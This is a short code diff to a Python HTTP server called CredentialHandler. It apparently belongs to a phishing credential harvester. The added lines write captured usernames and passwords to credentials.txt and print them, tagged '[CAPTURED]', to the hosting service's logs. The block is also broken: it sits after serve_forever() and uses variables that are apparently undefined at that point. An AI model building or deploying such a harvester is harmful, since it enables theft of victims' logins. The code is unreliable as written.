@@ -31,3 +31,12 @@ class CredentialHandler(http.server.SimpleHTTPRequestHandler):
 with socketserver.TCPServer(("0.0.0.0", PORT), CredentialHandler) as httpd:
     print(f"Server running on port {PORT}")
     httpd.serve_forever()
+
+# Log credentials to file
+timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+log_entry = f"{timestamp} | Username: {username}, Password: {password}\n"
+with open("credentials.txt", "a") as log_file:
+    log_file.write(log_entry)
+
+# ALSO print to console so it shows in Render Logs tab
+print(f"[CAPTURED] {log_entry}", flush=True)
